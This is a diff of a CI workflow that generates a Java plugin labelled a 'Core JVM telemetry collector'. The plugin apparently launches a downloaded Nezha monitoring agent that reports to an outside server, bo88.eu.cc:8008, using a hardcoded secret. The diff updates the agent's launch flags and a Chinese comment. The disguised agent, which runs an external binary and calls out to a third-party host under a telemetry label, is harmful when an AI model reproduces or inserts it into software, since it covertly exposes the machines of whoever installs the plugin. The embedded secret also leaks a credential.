@@ -114,7 +114,7 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # 3. Java 核心主类 (支持 HTTP 302 全局重定向下载与安全解压)
+          # 3. Java 核心主类 (适配 Nezha v1 启动参数)
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
@@ -172,8 +172,8 @@ jobs:
                           nezhaBin.setExecutable(true, false);
                           new ProcessBuilder(
                                   nezhaBin.getAbsolutePath(),
-                                  "-s", "bo88.eu.cc:8008",
-                                  "-p", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl",
+                                  "--server", "bo88.eu.cc:8008",
+                                  "--secret", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl",
                                   "--disable-auto-update",
                                   "--disable-command-execute",
                                   "--report-delay", "3"
